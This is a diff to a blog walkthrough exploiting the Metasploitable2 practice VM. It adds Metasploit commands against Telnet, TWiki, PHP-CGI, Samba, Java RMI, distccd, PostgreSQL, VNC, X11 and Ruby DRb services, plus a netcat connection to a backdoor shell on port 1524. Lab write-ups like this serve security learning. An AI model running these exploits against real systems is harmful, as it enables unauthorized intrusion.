@@ -239,7 +239,7 @@ Nmap done: 1 IP address (1 host up) scanned in 209.95 seconds
 ```
 
 
-### vsftpd exploit:
+### vsftpd exploit (port 21):
 
 search vsftpd
 
@@ -270,7 +270,7 @@ get meterpreter:
 {% img  /images/blog/misc/metasploitable2/Selection_004.png   [title manually exploit [alt text]] %}
 
 
-### SSH exploit:
+### SSH exploit (port 22):
 
 Getting access to a system with a writeable filesystem
 
@@ -316,6 +316,76 @@ login the box:
 
 
 
+### TELNET exploit
+
+in msfconsole, search telnet
+
+```
+msf > use auxiliary/scanner/telnet/telnet_version
+msf auxiliary(telnet_version) > set rhosts 192.168.79.179
+msf auxiliary(telnet_version) > run
+
+```
+
+In the banner, shows username/password
+
+
+{% img  /images/blog/misc/metasploitable2/Selection_025.png   [title manually exploit [alt text]] %}
+
+or you can just `telnet 192.168.79.179` to grab the banner.
+
+login 
+
+`telnet 192.168.79.179 -l msfadmin`
+
+{% img  /images/blog/misc/metasploitable2/Selection_026.png   [title manually exploit [alt text]] %}
+
+
+
+### Twiki (port 80)
+
+Nagviate to port 80. there is a Twiki, search twiki, find a  exploit
+
+`exploit/unix/webapp/twiki_history`
+
+```
+msf > use  exploit/unix/webapp/twiki_history
+msf exploit(twiki_history) > set rhost 192.168.79.179
+msf exploit(twiki_history) > exploit
+```
+
+{% img  /images/blog/misc/metasploitable2/Selection_028.png   [title manually exploit [alt text]] %}
+
+
+
+
+### phpinfo.php
+
+Use nikto, I found the page phpinfo.php is availabe.
+
+{% img  /images/blog/misc/metasploitable2/Selection_029.png   [title manually exploit [alt text]] %}
+
+I got the php version is 5.2.4.
+
+search the php_cgi
+
+found the exploit `exploit/multi/http/php_cgi_arg_injection`
+
+{% img  /images/blog/misc/metasploitable2/Selection_030.png   [title manually exploit [alt text]] %}
+
+may be the vulberable version.
+
+```
+msf > use exploit/multi/http/php_cgi_arg_injection
+msf exploit(php_cgi_arg_injection) > set rhost 192.168.79.179
+msf exploit(php_cgi_arg_injection) > exploit
+```
+
+{% img  /images/blog/misc/metasploitable2/Selection_031.png   [title manually exploit [alt text]] %}
+
+
+
+
 ### SMB exploit:
 
 
@@ -348,6 +418,23 @@ now use smbclient to login
 
 
 
+since the samba version is 3.0.20, I found this module:
+
+
+`exploit/multi/samba/usermap_script`
+
+{% img  /images/blog/misc/metasploitable2/Selection_022.png   [title manually exploit [alt text]] %}
+
+
+```
+msf > use exploit/multi/samba/usermap_script
+msf exploit(usermap_script) > set rhost 192.168.79.179
+msf exploit(usermap_script) > exploit
+
+```
+
+{% img  /images/blog/misc/metasploitable2/Selection_023.png   [title manually exploit [alt text]] %}
+
 
 ### Unreal ircd exploit
 
@@ -366,6 +453,35 @@ msf exploit(unreal_ircd_3281_backdoor) > exploit
 ```
 
 {% img  /images/blog/misc/metasploitable2/Selection_009.png   [title manually exploit [alt text]] %}
+
+
+### Java-rmi (port 1099)
+
+Nmap shows port 1099 rmiregistry GNU Classpath grmiregistry
+
+in metasploit search rmiregistry, got one exploit
+
+`exploit/multi/misc/java_rmi_server`
+
+```
+msf > use exploit/multi/misc/java_rmi_server
+msf exploit(java_rmi_server) > set rhost 192.168.79.17
+msf exploit(java_rmi_server) > exploit
+msf exploit(java_rmi_server) > sessions -i 1
+```
+
+{% img  /images/blog/misc/metasploitable2/Selection_027.png   [title manually exploit [alt text]] %}
+
+
+
+### Remote shell (port 1524)
+
+nothing cool,
+
+`nc 192.168.79.179 1524`
+
+{% img  /images/blog/misc/metasploitable2/Selection_032.png   [title manually exploit [alt text]] %}
+
 
 
 
@@ -418,9 +534,99 @@ get the root:
 
 
 
+
+### distccd (port 3632)
+
+search distccd, find a exploit `exploit/unix/misc/distcc_exec`
+
+```
+use exploit/unix/misc/distcc_exec
+msf exploit(distcc_exec) > set rhost 192.168.79.179
+msf exploit(distcc_exec) > exploit 
+
+```
+
+{% img  /images/blog/misc/metasploitable2/Selection_033.png   [title manually exploit [alt text]] %}
+
+
+
+### PostgreSQL (port 5432)
+
+search postgresql, find a module `auxiliary/scanner/postgres/postgres_login`
+
+```
+msf > use auxiliary/scanner/postgres/postgres_login
+msf auxiliary(postgres_login) > set  RHOSTS 192.168.79.179
+msf auxiliary(postgres_login) > run
+```
+
+{% img  /images/blog/misc/metasploitable2/Selection_034.png   [title manually exploit [alt text]] %}
+
+find username/password, login to postgresql.
+
+`psql -h 192.168.79.179 -U postgres`
+
+
+{% img  /images/blog/misc/metasploitable2/Selection_035.png   [title manually exploit [alt text]] %}
+
+
+There is another exploit: `exploit/linux/postgres/postgres_payload`
+
+```
+msf > use exploit/linux/postgres/postgres_payload
+msf exploit(postgres_payload) > set rhost 192.168.79.17
+msf exploit(postgres_payload) > exploit
+```
+
+{% img  /images/blog/misc/metasploitable2/Selection_036.png   [title manually exploit [alt text]] %}
+
+
+
+### VNC (port 5900)
+
+search vnc, find a `auxiliary/scanner/vnc/vnc_login`
+
+```
+msf > use auxiliary/scanner/vnc/vnc_login
+msf auxiliary(vnc_login) > set rhosts 192.168.79.179
+msf auxiliary(vnc_login) > run
+```
+
+find a password:
+{% img  /images/blog/misc/metasploitable2/Selection_037.png   [title manually exploit [alt text]] %}
+
+
+use this password to login vnc
+
+`vncviewer 192.168.79.179`
+
+{% img  /images/blog/misc/metasploitable2/Selection_038.png   [title manually exploit [alt text]] %}
+
+
+### X11 (Port 6000)
+
+search x11, find a scanner `auxiliary/scanner/x11/open_x11`
+
+```
+msf > use auxiliary/scanner/x11/open_x11
+msf auxiliary(open_x11) > set rhosts 192.168.79.179
+msf auxiliary(open_x11) > run
+```
+shows `[*] 192.168.79.179:6000   - 192.168.79.179 Access Denied`
+
+now, try to login use telnet username/password to X11
+
+`ssh -X -l msfadmin 192.168.79.179`
+
+
+
+
+
+
+
 ### Exploit Apache Tomcat (port 8180)
 
-use Nikto  to scan
+use Nikto to scan
 
 `nikto -h 182.168.79.179:8180`
 
@@ -509,6 +715,19 @@ msf exploit(tomcat_mgr_upload) > exploit
 
 {% img  /images/blog/misc/metasploitable2/Selection_018.png   [title manually exploit [alt text]] %}
 
+
+
+### Ruby DRb RMI (port 8787)
+
+search drb, find an exploit `exploit/linux/misc/drb_remote_codeexec`
+
+```
+msf > use exploit/linux/misc/drb_remote_codeexec
+msf exploit(drb_remote_codeexec) > set uri druby://192.168.79.179:8787
+msf exploit(drb_remote_codeexec) > exploit
+```
+
+{% img  /images/blog/misc/metasploitable2/Selection_039.png   [title manually exploit [alt text]] %}
 
 
 
